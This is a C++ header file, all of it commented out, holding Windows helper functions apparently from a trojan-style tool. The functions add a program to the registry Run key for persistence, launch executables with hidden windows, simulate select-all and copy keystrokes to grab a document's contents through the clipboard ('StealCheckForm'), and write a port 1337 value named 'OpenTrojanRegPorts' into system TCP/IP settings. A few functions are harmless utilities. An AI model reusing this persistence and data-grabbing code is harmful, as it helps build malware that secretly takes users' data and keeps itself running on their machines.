#pragma once 



//inline void RegKeyToRun(const char* PathToEXE, const char* MyEXE)
//{
//	HKEY hKey;
//	LPCTSTR lpSubKey = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
//	LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_SET_VALUE, &hKey);
//
//	if (lResult == ERROR_SUCCESS)
//	{
//		lResult = RegSetValueEx(hKey, MyEXE, 0, REG_SZ, (LPBYTE)PathToEXE, (_tcslen(PathToEXE) + 1) * sizeof(TCHAR));
//		RegCloseKey(hKey);
//	}
//}

//inline void HiddenEXE(const char* Path)
//{
//	STARTUPINFO si;
//	PROCESS_INFORMATION pi;
//
//	ZeroMemory(&si, sizeof(si));
//
//	si.cb = sizeof(si);
//	ZeroMemory(&pi, sizeof(pi));
//
//	si.dwFlags = STARTF_USESHOWWINDOW;
//	si.wShowWindow = SW_HIDE;
//
//	if (CreateProcess(Path, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
//	{
//		WaitForSingleObject(pi.hProcess, INFINITE);
//		CloseHandle(pi.hProcess);
//		CloseHandle(pi.hThread);
//	}
//}
//
//inline void PressHotKey(WORD key1, WORD key2)
//{
//	INPUT inputs[4];
//
//	inputs[0].type = INPUT_KEYBOARD;
//	inputs[0].ki.wVk = key1;
//	inputs[0].ki.dwFlags = 0;
//
//	inputs[1].type = INPUT_KEYBOARD;
//	inputs[1].ki.wVk = key2;
//	inputs[1].ki.dwFlags = 0;
//
//	inputs[2].type = INPUT_KEYBOARD;
//	inputs[2].ki.wVk = key2;
//	inputs[2].ki.dwFlags = KEYEVENTF_KEYUP;
//
//	inputs[3].type = INPUT_KEYBOARD;
//	inputs[3].ki.wVk = key1;
//	inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;
//
//	SendInput(4, inputs, sizeof(INPUT));
//}
//
//inline bool GetClipboardText(std::string& text)
//{
//	if (!OpenClipboard(NULL))
//	{
//		return false;
//	}
//
//	HANDLE hData = GetClipboardData(CF_TEXT);
//	if (hData == NULL)
//	{
//		CloseClipboard();
//		return false;
//	}
//
//	char* pszText = static_cast<char*>(GlobalLock(hData));
//	if (pszText == NULL)
//	{
//		CloseClipboard();
//		return false;
//	}
//
//	text = pszText;
//
//	GlobalUnlock(hData);
//	CloseClipboard();
//
//	return true;
//}
//
//inline void StealCheckForm(const char* myEXE)
//{
//	ShowWindow(GetConsoleWindow(), SW_HIDE);
//	ShellExecute(NULL, "open", _PathToDir(myEXE).c_str(), NULL, NULL, SW_SHOWNORMAL);
//
//	Sleep(1000);
//	PressHotKey(VK_CONTROL, 0x41);
//
//	Sleep(1000);
//	PressHotKey(VK_CONTROL, 0x43); 
//
//	Sleep(500);
//
//	std::string clipboardText;
//	if (GetClipboardText(clipboardText))
//	{
//		if (!clipboardText.empty())
//		{
//			char NAME[MAX_PATH];
//			sprintf(NAME, "%s.txt", Username().c_str());
//			std::ofstream outputFile(_PathToDir(NAME).c_str());
//
//			if (outputFile.is_open())
//			{
//				outputFile << clipboardText;
//				outputFile.close();
//			}
//		}
//	}
//}

//inline void OpenTrojanRegPorts()
//{
//    HKEY hKey;
//    LPCSTR subKey = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters";
//
//    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
//	{
//		DWORD openPorts[] = { 1337 };
//
//        DWORD dataSize = sizeof(openPorts);
//        RegSetValueEx(hKey, "OpenPorts", 0, REG_BINARY, reinterpret_cast<BYTE*>(openPorts), dataSize);
//        RegCloseKey(hKey);
//    } 
//}

//inline char* BSTRToChar(const BSTR bstr)
//{
//	const char* source = _com_util::ConvertBSTRToString(bstr);
//	char* result = _strdup(source);
//	return result;
//}
//
//
//inline BSTR CharToBSTR(const char* str)
//{
//	_bstr_t bStr(str);
//	return bStr.Detach();
//}

//inline void animateText(const std::string& text)
//{
//	std::string title;
//
//	for (char abc : text)
//	{
//		title += abc;
//		SetConsoleTitle(title.c_str());
//		std::this_thread::sleep_for(std::chrono::milliseconds(200));
//	}
//
//	std::this_thread::sleep_for(std::chrono::seconds(2));
//
//	for (size_t i = 0; i < text.length(); ++i)
//	{
//		title.pop_back();
//		SetConsoleTitle(title.c_str());
//		std::this_thread::sleep_for(std::chrono::microseconds(200));
//	}
//}



//inline void DeleteAllRegPorts()
//{
//	HKEY hKey;
//	LPCSTR subKey = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters";
//
//	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
//	{
//		RegDeleteValue(hKey, "BlockedPorts");
//		RegDeleteValue(hKey, "OpenPorts");
//
//		RegCloseKey(hKey);
//	}
//}

//inline void ListHiddenProcesses()
//{
//	HANDLE hProcessSnap;
//	PROCESSENTRY32 pe32;
//
//	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//
//	if (hProcessSnap == INVALID_HANDLE_VALUE)
//	{
//		return;
//	}
//
//	pe32.dwSize = sizeof(PROCESSENTRY32);
//
//	if (!Process32First(hProcessSnap, &pe32))
//	{
//		CloseHandle(hProcessSnap);
//		return;
//	}
//
//	do
//	{
//		if (sizeof(pe32.dwSize) > 0 && (pe32.th32ProcessID) > MAX_PATH && (pe32.szExeFile != NULL))
//		{
//			if (bLanguageOS())
//			{
//				printf("Скрытый процесс: %s\n", pe32.szExeFile);
//			}
//			else
//			{
//				printf("Hidden process: %s\n", pe32.szExeFile); 
//			}
//			char szPath[MAX_PATH];
//
//			HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
//
//			if (hProcess != NULL)
//			{
//				DWORD dwSize = sizeof(szPath);
//				if (QueryFullProcessImageNameA(hProcess, 0, szPath, &dwSize))
//				{
//					if (bLanguageOS())
//					{
//						printf("   Расположение: %s\n", szPath);
//					}
//					else
//					{
//						printf("   Location: %s\n", szPath);
//					}
//				}
//
//				CloseHandle(hProcess);
//			}
//		}
//
//		pe32.dwSize = sizeof(PROCESSENTRY32);
//	} while (Process32Next(hProcessSnap, &pe32));
//
//	CloseHandle(hProcessSnap);
//}